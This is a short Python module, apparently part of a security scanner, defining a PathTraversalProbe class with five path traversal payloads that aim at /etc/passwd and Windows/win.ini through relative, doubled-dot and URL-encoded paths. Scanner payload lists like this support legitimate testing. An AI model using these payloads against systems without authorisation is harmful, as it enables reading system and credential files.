"""Path traversal probe module."""

from typing import List


class PathTraversalProbe:
    """Specialized Path Traversal payload vectors."""

    DEFAULT_PAYLOADS: List[str] = [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "/etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "../../../../Windows/win.ini",
    ]

    @staticmethod
    def get_candidate_payloads() -> List[str]:
        return list(PathTraversalProbe.DEFAULT_PAYLOADS)
